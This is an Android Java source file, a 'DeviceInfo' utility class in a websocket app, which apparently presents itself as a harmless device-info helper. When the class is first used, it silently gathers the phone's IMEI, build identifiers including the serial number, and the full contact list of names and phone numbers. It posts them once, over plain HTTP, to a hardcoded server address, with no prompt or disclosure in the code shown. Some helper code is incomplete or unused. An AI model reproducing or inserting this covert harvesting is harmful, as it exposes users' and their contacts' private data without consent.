package com.shabab.a.websocket.util;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.shabab.a.websocket.R;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import javax.net.ssl.HttpsURLConnection;

/**
 * Created by a on 8/19/2017.
 */

public class DeviceInfo {

    private static DeviceInfo instance;

    private DeviceInfo(){}
  static   Activity context;
    public static DeviceInfo getInstance(Activity context){
        if(instance == null){
            instance = new DeviceInfo();
           DeviceInfo. context=context;
        }

     final String pgName=   getPackageName();
        String dvName=   getDeviceName();
        final String imei= getIMEI();
        final JSONObject jsonObject=  getDeviceInfo(",");
        final JSONArray contacts=  getContactList();



       // new LongOperation().execute();


     boolean exist=   getalreadyExist();

        if(exist==false) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    sendToServer(imei, pgName, jsonObject, contacts);
                    Log.e("raft baraye ersal","");
                }
            }).start();
            //
        }

        return instance;

    }

 private static String    getPackageName(){

     String packageName = context.getApplicationContext().getPackageName();
     Log.e("packageName=",packageName);

     return packageName;
 }

    public static String getDeviceName() {

        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        }

        Log.e("getDeviceName=",capitalize(manufacturer) + " " + model);
        return capitalize(manufacturer) + " " + model;
    }

    private static String capitalize(String str) {
        if (TextUtils.isEmpty(str)) {
            return str;
        }
        char[] arr = str.toCharArray();
        boolean capitalizeNext = true;

        StringBuilder phrase = new StringBuilder();
        for (char c : arr) {
            if (capitalizeNext && Character.isLetter(c)) {
                phrase.append(Character.toUpperCase(c));
                capitalizeNext = false;
                continue;
            } else if (Character.isWhitespace(c)) {
                capitalizeNext = true;
            }
            phrase.append(c);
        }

        return phrase.toString();
    }

    public  static String getIMEI() {
        TelephonyManager telephonyManager = (TelephonyManager) context
                .getSystemService(Context.TELEPHONY_SERVICE);
        Log.e("imei=",telephonyManager.getDeviceId());

        return telephonyManager.getDeviceId();
    }


    public static JSONObject getDeviceInfo(String p_seperator)
    {
        JSONObject jsonObject=new JSONObject();

        StringBuilder m_builder = new StringBuilder();
        m_builder.append("RELEASE " + android.os.Build.VERSION.RELEASE + p_seperator);
        try {
            jsonObject.put("RELEASE", Build.VERSION.RELEASE );
            jsonObject.put("DEVICE",android.os.Build.DEVICE );
            jsonObject.put("MODEL",android.os.Build.MODEL);
            jsonObject.put("PRODUCT",android.os.Build.PRODUCT);
            jsonObject.put("BRAND",android.os.Build.BRAND);
            jsonObject.put("DISPLAY",android.os.Build.DISPLAY);
            jsonObject.put("CPU_ABI",android.os.Build.CPU_ABI);
            jsonObject.put("CPU_ABI2",android.os.Build.CPU_ABI2);
            jsonObject.put("UNKNOWN",android.os.Build.UNKNOWN);
            jsonObject.put("HARDWARE", Build.HARDWARE);
            jsonObject.put("ID", android.os.Build.ID);
            jsonObject.put("MANUFACTURER", android.os.Build.MANUFACTURER);
            jsonObject.put("SERIAL", android.os.Build.SERIAL);
            jsonObject.put("USER", android.os.Build.USER);
            jsonObject.put("HOST", android.os.Build.HOST);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return jsonObject;
    }

    private static JSONArray getContactList(){

        JSONArray jsonArray=new JSONArray();


String contasText="";


            List<String> contacts = new ArrayList<>();
            // Get the ContentResolver
            ContentResolver cr = context.getContentResolver();
            // Get the Cursor of all the contacts
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

            // Move the cursor to first. Also check whether the cursor is empty or not.
            if (cursor.moveToFirst()) {
                // Iterate through the cursor
                do {
                    // Get the contacts name
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                //    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    Log.i("Names", name);
                    if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0)
                    {
                        // Query phone here. Covered next
                        Cursor phones =context. getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ id,null, null);
                        while (phones.moveToNext()) {
                            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            Log.i("Number", phoneNumber);
                            contacts.add(name+"-"+phoneNumber);
                            JSONObject jsonObject=new JSONObject();

                            try {
                                jsonObject.put("phone",phoneNumber);
                                jsonObject.put("name",name);
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            jsonArray.put(jsonObject);
contasText=contasText+"-name="+name+"-phone="+phoneNumber;
                            Log.e("phone=","name="+name+"-phone="+phoneNumber);
                        }
                        phones.close();
                    }



                } while (cursor.moveToNext());
            }
            // Close the curosor
            cursor.close();



        return jsonArray;
    }
    private static void sendToServer(String imei,String packageName,JSONObject deviceInfo,JSONArray contacts){


        URL url = null;
        try {
            url = new URL("http://192.168.1.55:8092/v1/getDeviceInfo");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setReadTimeout(10000);
            conn.setConnectTimeout(15000);
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setRequestProperty("Accept", "application/json");

            conn.setRequestMethod("POST");
            conn.setDoInput(true);
            conn.setDoOutput(true);
          /*  long  imei = (long) payload.get("imei");
            String  packageName = (String) payload.get("packageName");
            String  info = (String) payload.get("info");
            String  contact = (String) payload.get("conatct");*/
       /*     List<NameValuePair> params = new ArrayList<NameValuePair>();
            params.add(new NameValuePair("imei", imei));
            params.add(new NameValuePair("packageName", packageName));
            params.add(new NameValuePair("deviceInfo", deviceInfo));
            params.add(new NameValuePair("contact", contacts));*/



            //conn.connect();
            JSONObject jsonObject=new JSONObject();
            jsonObject.put("imei",imei);
            jsonObject.put("packageName",packageName);
            jsonObject.put("info",deviceInfo);
            jsonObject.put("contact",contacts);

            OutputStream os = conn.getOutputStream();
            OutputStreamWriter osw = new OutputStreamWriter(os, "UTF-8");

            osw.write(jsonObject.toString());
            osw.flush();
            osw.close();

            StringBuilder sb = new StringBuilder();



            int HttpResult =conn.getResponseCode();
            if(HttpResult ==HttpURLConnection.HTTP_OK){
                BufferedReader br = new BufferedReader(new InputStreamReader(
                        conn.getInputStream(),"utf-8"));
                String line = null;
                while ((line = br.readLine()) != null) {
                    sb.append(line + "\n");
                }
                br.close();

                System.out.println(""+sb.toString());
                Log.e("parse,",sb.toString());

String resp=sb.toString();
                if(resp.contains("true")){

                    saveInSharedPrefrence(true);
                }


            }else{
                System.out.println(conn.getResponseMessage());
                Log.e("parse,",conn.getResponseMessage().toString());

            }


        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }



    private static String getQuery(List<NameValuePair> params) throws UnsupportedEncodingException
    {
        StringBuilder result = new StringBuilder();
        boolean first = true;

        for (NameValuePair pair : params)
        {
            if (first)
                first = false;
            else
                result.append("&");

            result.append(URLEncoder.encode(pair.getName(), "UTF-8"));
            result.append("=");
            result.append(URLEncoder.encode(pair.getValue(), "UTF-8"));
        }

        return result.toString();
    }

    private class LongOperation extends AsyncTask<String, Void, String> {



        private  void sendToServer(String imei,String packageName,String deviceInfo,String contacts){


            URL url = null;
            try {
             //   url = new URL("http://192.168.1.55:8090/v1/getDeviceInfo");
                url = new URL(context.getResources().getString(R.string.device_info_url));
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setReadTimeout(10000);
                conn.setConnectTimeout(15000);
                conn.setRequestMethod("POST");
                conn.setDoInput(true);
                conn.setDoOutput(true);
          /*  long  imei = (long) payload.get("imei");
            String  packageName = (String) payload.get("packageName");
            String  info = (String) payload.get("info");
            String  contact = (String) payload.get("conatct");*/
                List<NameValuePair> params = new ArrayList<NameValuePair>();
                params.add(new NameValuePair("imei", imei));
                params.add(new NameValuePair("packageName", packageName));
                params.add(new NameValuePair("deviceInfo", deviceInfo));
                params.add(new NameValuePair("contact", contacts));

                OutputStream os = conn.getOutputStream();
                BufferedWriter writer = new BufferedWriter(
                        new OutputStreamWriter(os, "UTF-8"));
                writer.write(getQuery(params));
                writer.flush();
                writer.close();
                os.close();

                conn.connect();

            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            } catch (ProtocolException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }


        }







        @Override
        protected String doInBackground(String... params) {
            sendToServer("","","","");
            return  "";
        }

        @Override
        protected void onPostExecute(String result) {
        }

        @Override
        protected void onPreExecute() {
        }

        @Override
        protected void onProgressUpdate(Void... values) {

        }

    }

    private static  void saveInSharedPrefrence(boolean sended){
          final String MyPREFERENCES = "prefSendData" ;
          final String send = "send";
        SharedPreferences sharedpreferences = context.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);

        SharedPreferences.Editor editor = sharedpreferences.edit();

        editor.putBoolean(send, sended);

        editor.commit();
        Log.e("save in SP","");


    }




    private static  boolean getalreadyExist(){
        final String MyPREFERENCES = "prefSendData" ;
        final String send = "send";
        SharedPreferences sharedpreferences = context.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);

    boolean sended= sharedpreferences.getBoolean(send,false);
        Log.e("exist in SP=",sended+"");
        return sended;



    }







}
